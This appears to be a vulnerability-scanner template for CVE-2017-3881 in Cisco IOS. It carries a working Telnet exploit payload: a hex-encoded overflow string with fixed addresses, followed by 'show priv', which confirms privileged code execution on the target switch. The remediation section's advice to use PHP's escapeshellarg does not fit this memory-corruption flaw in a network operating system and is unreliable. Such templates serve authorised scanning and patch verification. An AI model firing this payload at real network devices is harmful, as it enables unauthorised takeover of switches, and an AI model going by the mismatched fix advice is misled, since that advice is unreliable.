id: CVE-2017-3881
info:
  name: Cisco IOS 12.2(55)SE11 - Remote Code Execution
  author:
  - l0ne1y
  description: |-
    Cisco IOS 代码执行漏洞
    Cisco Catalyst Switches等都是美国思科（Cisco）公司的交换机产品。Cisco IOS和IOS XE都是运行于其中的操作系统。

    多款Cisco产品中的IOS和IOS XE Software的Cluster Management Protocol (CMP)处理代码存在远程代码执行漏洞。远程攻击者可利用该漏洞造成受影响设备重载，或以提升的权限执行代码。以下设备受到影响：Cisco Catalyst switches；Embedded Service 2020 switches；Enhanced Layer 2 EtherSwitch Service Module；Enhanced Layer 2/3 EtherSwitch Service Module；Gigabit Ethernet Switch Module (CGESM) for HP；IE Industrial Ethernet switches；ME 4924-10GE switch；RF Gateway 10；SM-X Layer 2/3 EtherSwitch Service Module。
  severity: critical
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvd48893

    临时修复方案：
    1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。
    2、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“;”会被转义为“\\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
network:
- matchers:
  - type: word
    words:
    - Current privilege level is
  host:
  - '{{Hostname}}'
  - '{{Host}}:23'
  inputs:
  - data: '{{hex_decode(''fffa240003'')}}CISCO_KITS{{hex_decode(''01'')}}2:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA{{hex_decode(''000037b4023d55dc0000999c'')}}BBBB{{hex_decode(''00e1a9f4'')}}CCCCDDDDEEEE{{hex_decode(''00067b5c023d55c8'')}}FFFFGGGG{{hex_decode(''006cb3a000270b94'')}}HHHHIIII{{hex_decode(''014acf98'')}}JJJJKKKKLLLL{{hex_decode(''0114e7ec'')}}:15:{{hex_decode(''fff0'')}}'
    read: 1024
  - data: show priv
    read: 1024
  read-size: 1024
